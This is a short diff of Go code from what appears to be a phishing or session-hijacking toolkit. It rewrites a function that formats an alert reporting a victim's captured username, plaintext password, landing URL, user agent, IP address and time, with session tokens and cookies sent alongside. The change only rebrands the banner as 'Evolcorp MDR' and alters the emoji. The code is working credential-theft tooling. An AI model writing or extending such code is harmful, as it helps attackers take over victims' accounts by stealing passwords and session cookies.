@@ -178,15 +178,15 @@ func createTxtFile(session Session) (string, error) {
 
 func formatSessionMessage(session Session) string {
 	// Format the session information (no token data in message)
-	return fmt.Sprintf("✨ Session Information ✨\n\n"+
-    "👤 Username:      ➖ %s\n"+
-    "🔑 Password:      ➖ %s\n"+
-    "🌐 Landing URL:   ➖ %s\n \n"+
-    "🖥️ User Agent:    ➖ %s\n"+
-    "🌍 Remote Address:➖ %s\n"+
-    "🕒 Create Time:   ➖ %d\n"+
+	return fmt.Sprintf("🔐 Evolcorp MDR 🔐\n\n"+
+    "👤 Username:      🪤 %s\n"+
+    "🔑 Password:      🪤 %s\n"+
+    "🌐 Landing URL:   🪤 %s\n \n"+
+    "🖥️ User Agent:    🪤 %s\n"+
+    "🌍 Remote Address:🪤 %s\n"+
+    "🕒 Create Time:   🪤 %d\n"+
     "\n"+
-    "📦 Tokens are added in txt file and attached separately in message.\n",
+    "📦 Token Delivery. 🍪 incoming.\n",
     session.Username,
     session.Password,
     session.LandingURL,
